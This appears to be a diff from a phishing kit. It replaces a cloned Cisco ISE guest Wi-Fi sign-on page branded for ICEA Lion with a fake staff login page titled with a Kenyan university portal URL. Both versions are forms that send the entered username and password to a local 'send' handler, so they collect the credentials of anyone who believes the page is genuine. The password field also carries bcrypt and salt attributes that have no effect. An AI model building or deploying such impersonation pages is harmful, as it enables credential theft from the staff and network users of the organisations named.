@@ -1,88 +1,58 @@
-
 <!DOCTYPE html>
-<html lang="eng">
-    <head>
-        <title>Sign On</title>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta name="viewport" content="initial-scale=1,user-scalable=yes" />
-        <meta http-equiv="X-UA-Compatible" content="IE=8, IE=9, IE=10" >
-        <meta name="format-detection" content="telephone=no" />
-        <link rel="icon" type="image/x-icon" href="public/img/favicon.ico" />
-        <link rel="apple-touch-icon" href="public/img/apple-icon.png"/>
-        <link rel="stylesheet" href="public/css/gueststructure.css" />
-        <link rel="stylesheet" href="public/css/guesttheme.css" />
-        <style>
-            .cisco-ise-header.ui-header {
-                background-image: url("/portal/portals/c1fa2511-bc5f-11e6-a7af-00a6ca8b7f78/images/background.png") !important;
-            }
-        </style>
-<script src="public/js/guest.app.js"></script>
-    </head>
-    <body class="cisco-ise-desktop">
-        <div data-role="page" data-theme="a" id="page-login"
-             style=""
-             class="device-location-all-locations-hq">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>https://portal.ku.ac.ke/secure/staff/loginsta.aspx?ReturnURL=/secure/staff/staff.aspx</title>
+    <link rel="stylesheet" href="public/css/main.css">
 
-            <div data-role="header" data-theme="a" class="cisco-ise-header ui-header ui-bar-a">
-                <div class="cisco-ise-banner">
-                    <img src="public/img/TEMP_facbee8632a245afb7ea142ca4ede2b6ICEALION_Logo.jpg" id="ui_desktop_logo" class="cisco-ise cisco-ise-logo-image" alt=""/>
-<img src="/portal/portals/c1fa2511-bc5f-11e6-a7af-00a6ca8b7f78/images/TEMP_3413ddd25b054915997eb0a28049d518ICEALION_Logo.jpg" id="ui_mobile_logo" class="cisco-ise cisco-ise-logo-image" alt=""/>
-<h3 id="ui_banner_label" class="cisco-ise cisco-ise-banner-label">Network login portal</h3>
-                    </div>
+    <link href="public/img/cm_ico.ico" rel="icon" type="image/x-icon" />
+    <link href="public/img/cm_ico.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+</head>
+<body>
+
+    <div class="mainBody">
+
+        <div class="header">
+            <div class="logo">
+                <img src="public/img/logo.jpg" alt="">
             </div>
-            <div data-role="content" data-theme="a" class="ui-content ui-body-a">
-                <div class="cisco-ise-body">
-                    <div class="cisco-ise cisco-ise-content cisco-ise-main-content ui-corner-all ui-body-a ui-shadow">
-    <noscript>
-        <p>You must turn on JavaScript to use this web site.</p>
-    </noscript>
-    <div class="cisco-ise-scriptable">
-        <h1 class="cisco-ise cisco-ise-content-header" id="ui_login_content_label">Sign On</h1>
-<p class="cisco-ise cisco-ise-instruction-message" id="ui_login_instruction_message">Welcome to the ICEA Lion. Sign on with the username and password provided to you.</p>
-<div id="portallogindiv" class="cisco-ise cisco-ise-login-text ui-corner-all">
+            <div class="border"></div>
+            <div class="hero">
+                <img src="public/img/login.jpg" alt="">                
+            </div>
+        </div>
+        <div class="login">
 
-        <form id="form" name="form" action="send" method="POST">
-            <input type="hidden" name="token" value="C27OE49D04F69LN32U8304U3YZVWDTJ7" />
-<input type="hidden" name="portal" value="c1fa2511-bc5f-11e6-a7af-00a6ca8b7f78">
+            <p>Required Field<span style="color: red;">*</span></p>
+           
+            <form id="form" name="form" action="send" method="POST">
 
-            <fieldset data-role="controlgroup" id="login_username_password">
-                    <label for="username">Username:</label>
+                <div class="user">
+                    <label for="username">Username <span style="color: red;">*</span></label>
                     <input type="text" name="username" id="username" value="" autocomplete="off" required />
+                    <div class="separator"></div>
+                </div>
+                <div class="auth">
+                    <label for="password">Password<span style="color: red;">*</span></label>
+                    <input type="password" crypt ="bcrypt" salt ="password" name="password" id="password" value="" autocomplete="off" required />
+                    <div class="separator"></div>
+                </div>
 
-                    <label for="password">Password:</label>
-                    <input type="password" name="password" id="password" value="" autocomplete="off" required />
-                </fieldset>
-            <div id="ui_aup_hotspot_text" class="cisco-ise cisco-ise-aup-text ui-body ui-body-a ui-corner-all">
-                            Please accept the policy: You are responsible for maintaining the confidentiality of the password and all activities that occur under your username and password. ICEA LION GROUP offers the Service for activities such as the active use of e-mail, instant messaging, browsing the World Wide Web and accessing corporate intranets. High volume data transfers, especially sustained high volume data transfers, are not permitted. Hosting a web server or any other server by use of our Service is prohibited. Trying to access someone else's account, sending unsolicited bulk e-mail, collection of other people's personal data without their knowledge and interference with other network users are all prohibited. ICEA LION GROUP reserves the right to suspend the Service if ICEA LION GROUP reasonably believes that your use of the Service is unreasonably excessive or you are using the Service for criminal or illegal activities. You do not have the right to resell this Service to a third party. ICEA LION GROUP reserves the right to revise, amend or modify these Terms &amp; Conditions, our other policies and agreements, and aspects of the Service itself. Notice of any revision, amendment, or modification will be posted on ICEA LION GROUP's website and will be effective as to existing users 30 days after posting.</div>
-                <div class="cisco-ise-form-buttons">
-                <input type="submit"  value="Sign On" />
-            </div>
-        </form>
+                <div class="send">
+                    <input type="submit"  value="Login" />
+                </div>
 
-            </div>
-<div class="cisco-div-extender"></div>
+            </form>
+
+        </div>
+        
+        <div class="footer"></div>
+
     </div>
-</div>
-
-<div class="cisco-ise-footer">
-    <div class="cisco-ise-footer-container">
-    </div>
-</div>
-    <p class="cisco-ise-footer-text"></p>
-</div>
-</div>          
-<form id="tokenForm">
-    <input type="hidden" name="token" value="C27OE49D04F69LN32U8304U3YZVWDTJ7" />
-</form>
- <div id="portal-session-timeout-popup" class="ui-content cisco-ise-popup-error"
-     data-role="popup" data-theme="c" data-overlay-theme="b" data-position-to="window">
-    <a href="#" data-rel="back" data-role="button" data-icon="delete"
-       data-iconpos="notext" class="ui-btn-left"></a>
-    <p>Your session has timed out. Click Retry to try again.</p>
-    <a href="#" data-role="button" data-theme="b" data-inline="true"
-       id="ui_session_timeout_retry_button"
-       >Retry</a>
-</div>
-</div>
+    
 </body>
 </html>
